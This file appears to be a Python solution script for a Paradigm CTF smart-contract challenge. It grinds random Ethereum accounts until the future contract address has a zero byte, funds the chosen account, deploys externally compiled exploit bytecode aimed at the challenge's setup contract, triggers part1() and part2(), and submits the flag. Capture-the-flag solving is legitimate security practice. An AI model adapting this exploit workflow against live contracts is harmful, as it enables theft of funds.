from paradigmctf import *

from typing import Callable
from eth_account import Account
from eth_account.signers.local import LocalAccount

def find_account(predicate: Callable[[LocalAccount], bool]) -> LocalAccount:
    while True:
        account = Account.create()

        if predicate(account):
            return account

def predicate(account: LocalAccount) -> bool:      
    contract_addr = Web3.soliditySha3(['bytes1', 'bytes1', 'address', 'bytes1'], ["0xd6", "0x94", account.address, "0x80"])[12:].hex()

    return contract_addr[-10:-8].lower() == "00"

account = find_account(predicate)

exploit_bytecode = compile()

uuid, web3, address, setup = init()

send_tx(web3, {
    "from": address,
    "to": account.address,
    "gas": 12_500_000,
    "value": web3.toWei(100, "ether"),
})

rcpt = sign_send_tx(web3, account, {
    "gas": 12_500_000,
    "gasPrice": 0,
    "nonce": 0,
    "data": exploit_bytecode + (setup[2:]).rjust(64, "0"),
})

print(rcpt.contractAddress)

sign_send_tx(web3, account, {
    "to": rcpt.contractAddress,
    "gas": 12_500_000,
    "gasPrice": 0,
    "nonce": 1,
    "data": web3.sha3(text="part1()")[:10],
})

sign_send_tx(web3, account, {
    "to": rcpt.contractAddress,
    "gas": 12_500_000,
    "gasPrice": 0,
    "nonce": 2,
    "data": web3.sha3(text="part2()")[:10],
})

submit(uuid)